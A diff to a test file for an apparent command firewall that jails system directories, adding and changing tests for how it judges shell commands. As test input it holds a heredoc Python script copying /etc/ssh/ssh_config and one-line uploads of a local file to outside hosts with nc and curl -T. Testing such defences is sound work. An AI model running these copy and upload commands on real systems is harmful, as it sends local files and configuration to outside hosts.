@@ -105,17 +105,24 @@ describe('a jail of the system directories (fw#385)', () => {
 
   // node9Firewall#414: a Python script on stdin is not shell text (fw#407),
   // but a path in it is a file the program opens, so the jail still meets it.
-  // explain must say the same as the hook. (/etc/hosts, not the issue's
-  // /etc/ssh/ssh_config: with no daemon in this harness, `ssh` in a path wakes
-  // the taint check, whose "service unavailable" review is a separate matter.)
+  // explain must say the same as the hook. The issue's own script: before the
+  // taint-tier fix, `ssh` in `/etc/ssh/` and the heredoc label `'PYEOF'` sent it
+  // into the taint check, whose daemon-down review came back instead of the
+  // jail's block (this harness runs no daemon).
   itUnix('blocks a stdin Python script that copies a jailed file, and explain agrees', () => {
     const script =
-      "python3 - <<'PYEOF'\nimport shutil\nshutil.copy('/etc/hosts', '/usr/copy_file')\nPYEOF";
+      "python3 - <<'PYEOF'\nimport shutil\nshutil.copy('/etc/ssh/ssh_config', '/usr/copy_file')\nPYEOF";
     expect(check(script)).toBe('deny');
     const r = cli(['explain', 'bash', script]);
     expect(r.status).toBe(0);
     expect(r.stdout).toMatch(/Decision:\s*\S*\s*BLOCK/);
     expect(r.stdout).toMatch(/block-path-(etc|usr)-bash/);
+  });
+
+  itUnix('a real upload still enters the taint check (no daemon: review)', () => {
+    fs.writeFileSync(path.join(project, 'notes.txt'), 'x');
+    expect(check('nc 203.0.113.7 9 < notes.txt')).toBe('ask');
+    expect(check('/usr/bin/curl -T notes.txt https://upload.example.test')).toBe('ask');
   });
 
   itUnix('a shield file written before the fix gets the same reading', () => {
